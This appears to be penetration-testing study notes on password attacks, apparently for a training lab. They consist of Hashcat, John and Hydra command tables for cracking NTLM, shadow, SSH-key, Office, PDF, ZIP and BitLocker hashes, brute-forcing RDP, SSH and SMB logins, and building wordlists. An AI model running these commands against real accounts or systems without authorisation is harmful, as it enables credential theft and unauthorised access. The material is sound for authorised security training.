# Password Attacks

## Generate username list



`./username-anarchy -i /home/ltnbob/names.txt`

## John



| Command                 | Description                                   |
| ----------------------- | --------------------------------------------- |
| `pdf2john`              | Converts PDF documents for John               |
| `ssh2john`              | Converts SSH private keys for John            |
| `mscash2john`           | Converts MS Cash hashes for John              |
| `keychain2john`         | Converts OS X keychain files for John         |
| `rar2john`              | Converts RAR archives for John                |
| `pfx2john`              | Converts PKCS#12 files for John               |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
| `keepass2john`          | Converts KeePass databases for John           |
| `vncpcap2john`          | Converts VNC PCAP files for John              |
| `putty2john`            | Converts PuTTY private keys for John          |
| `zip2john`              | Converts ZIP archives for John                |
| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
| `office2john`           | Converts MS Office documents for John         |
| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |

## Cracking Password (Hashcat / John/ Hydra)

| Command                                                                                                      | Description                                                                                                                                    |
| ------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| `hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt`                                          | Uses Hashcat to crack NTLM hashes using a specified wordlist.                                                                                  |
| `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show`                   | Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.                                            |
| `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`                                          | Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.                                      |
| `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`                         | Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked. |
| `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`                                                            | Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file.                                              |
| `hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked` | Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked.        |
| `ssh2john.pl SSH.private > ssh.hash`                                                                         | Runs Ssh2john.pl script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash.      |
| `john ssh.hash --show`                                                                                       | Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal.                                       |
| `office2john.py Protected.docx > protected-docx.hash`                                                        | Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.                      |
| `john --wordlist=rockyou.txt protected-docx.hash`                                                            | Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash.                                                  |
| `pdf2john.pl PDF.pdf > pdf.hash`                                                                             | Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked.                                                                      |
| `john --wordlist=rockyou.txt pdf.hash`                                                                       | Runs John in conjunction with a wordlist to crack a pdf hash.                                                                                  |
| `zip2john ZIP.zip > zip.hash`                                                                                | Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash.                                            |
| `john --wordlist=rockyou.txt zip.hash`                                                                       | Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash.                                                            |
| `bitlocker2john -i Backup.vhd > backup.hashes`                                                               | Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes.                            |
| `grep "bitlocker\$0" backup.hashes > backup.hash`                                                            |                                                                                                                                                |
| `file GZIP.gzip`                                                                                             | Uses the Linux-based file tool to gather file format information.                                                                              |
| `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \\| tar xz;done` | Script that runs a for-loop to extract files from an archive.                                                                                  |
| `hydra -L user.list -P password.list rdp://10.129.42.197`                                                    | Hydra RDP                                                                                                                                      |
| `hydra -L user.list -P password.list ssh://10.129.42.197`                                                    | Hydra SSH                                                                                                                                      |
| `hydra -L user.list -P password.list smb://10.129.42.197`                                                    | Hydra SMB                                                                                                                                      |
| `best64.rule`                                                                                                | Best custom rule                                                                                                                               |
| `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`                                | Generate custom wordlist                                                                                                                       |

## Generate rule based wordlist with Hashcat

```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```
